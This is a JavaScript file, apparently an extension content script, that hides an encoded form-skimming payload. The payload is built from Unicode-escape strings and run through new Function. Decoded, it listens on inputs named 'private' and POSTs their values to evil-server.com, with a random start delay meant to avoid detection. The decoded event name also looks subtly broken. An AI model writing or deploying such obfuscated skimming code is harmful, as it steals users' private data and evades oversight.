// String manipulation utilities for obfuscation
const StringObfuscator = {
    // Convert string to Unicode escape sequence representation
    toUnicodeEscape: function(str) {
        let result = '';
        for (let i = 0; i < str.length; i++) {
            const hex = str.charCodeAt(i).toString(16).padStart(4, '0');
            result += '\\u' + hex;
        }
        return result;
    },

    // Build string from concatenated Unicode parts
    buildFromParts: function(parts) {
        return parts.map(part => {
            const decoded = part.replace(/\\u[\dA-F]{4}/gi, match => {
                return String.fromCharCode(parseInt(match.replace(/\\u/g, ''), 16));
            });
            return decoded;
        }).join('');
    },

    // Create dynamic function with obfuscated code
    createDynamicFunction: function(codeParts) {
        const assembledCode = this.buildFromParts(codeParts);
        return new Function(assembledCode);
    }
};

// Core injection logic with obfuscation
const ExtensionInjector = {
    // Obfuscated payload components
    payloadParts: [
        '\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074',
        '\\u002e\\u0061\\u0064\\u0064\\u0045\\u0076\\u0065\\u006e\\u0074\\u004c\\u0069\\u0073\\u0074\\u0065\\u006e\\u0065\\u0072',
        '\\u0028\\u0027\\u0064\\u006f\\u006d\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u006c\\u006f\\u0061\\u0064\\u0065\\u0064\\u0027',
        '\\u002c\\u0066\\u0075\\u006e\\u0063\\u0074\\u0069\\u006f\\u006e\\u0028\\u0029\\u007b',
        '\\u0063\\u006f\\u006e\\u0073\\u0074\\u0020\\u0066\\u006f\\u0072\\u006d\\u0073\\u003d',
        '\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074\\u002e\\u0071\\u0075\\u0065\\u0072\\u0079\\u0053\\u0065\\u006c\\u0065\\u0063\\u0074\\u006f\\u0072\\u0041\\u006c\\u006c',
        '\\u0028\\u0027\\u0069\\u006e\\u0070\\u0075\\u0074\\u005b\\u006e\\u0061\\u006d\\u0065\\u002a\\u003d\\u0022\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u0022\\u005d\\u0027\\u0029',
        '\\u003b\\u0066\\u006f\\u0072\\u0028\\u006c\\u0065\\u0074\\u0020\\u0066\\u0020\\u006f\\u0066\\u0020\\u0066\\u006f\\u0072\\u006d\\u0073\\u0029\\u007b',
        '\\u0066\\u002e\\u0061\\u0064\\u0064\\u0045\\u0076\\u0065\\u006e\\u0074\\u004c\\u0069\\u0073\\u0074\\u0065\\u006e\\u0065\\u0072\\u0028',
        '\\u0027\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065\\u0027\\u002c\\u0065\\u003d\\u003e\\u007b',
        '\\u0066\\u0065\\u0074\\u0063\\u0068\\u0028\\u0022\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0065\\u0076\\u0069\\u006c\\u002d\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u002e\\u0063\\u006f\\u006d\\u002f\\u006c\\u006f\\u0067\\u0022\\u002c',
        '\\u007b\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003a\\u0022\\u0050\\u004f\\u0053\\u0054\\u0022\\u002c',
        '\\u0062\\u006f\\u0064\\u0079\\u003a\\u004a\\u0053\\u004f\\u004e\\u002e\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0069\\u0066\\u0079',
        '\\u0028\\u007b\\u0064\\u0061\\u0074\\u0061\\u003a\\u0065\\u002e\\u0074\\u0061\\u0072\\u0067\\u0065\\u0074\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u007d\\u0029\\u007d\\u0029\\u007d\\u0029\\u007d\\u007d\\u0029'
    ],

    // Execute obfuscated injection
    execute: function() {
        try {
            const maliciousFunc = StringObfuscator.createDynamicFunction(this.payloadParts);
            maliciousFunc.call(window);
            console.log(StringObfuscator.buildFromParts([
                '\\u0049\\u006e\\u006a\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e',
                '\\u0020\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u0066\\u0075\\u006c'
            ]));
        } catch (err) {
            console.error('Injection failed:', err);
        }
    }
};

// Main execution with delay to avoid detection
setTimeout(() => {
    ExtensionInjector.execute();
}, Math.random() * 5000 + 2000);